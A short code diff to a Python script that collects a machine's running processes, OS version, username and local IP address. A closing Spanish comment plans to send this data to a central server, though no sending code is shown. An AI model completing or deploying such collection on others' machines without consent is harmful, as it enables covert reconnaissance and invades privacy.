@@ -8,6 +8,7 @@ from platform import platform
 import platform
 import os
 import getpass
+import socket
 
 
 ProcessList= [os.popen('wmic process get description, processid').read()]
@@ -18,3 +19,10 @@ NameOS = platform.system()
 VersionOS = platform.version()
 #print(NameOS, VersionOS, user, ProcessInfo)
 
+
+#Se crea el objeto para tener el valor de la IP de la maquina
+ServidorIp = socket.gethostbyname(socket.gethostname())
+#print(ServidorIp)
+
+
+#Enviar informacion a servidor centralizado
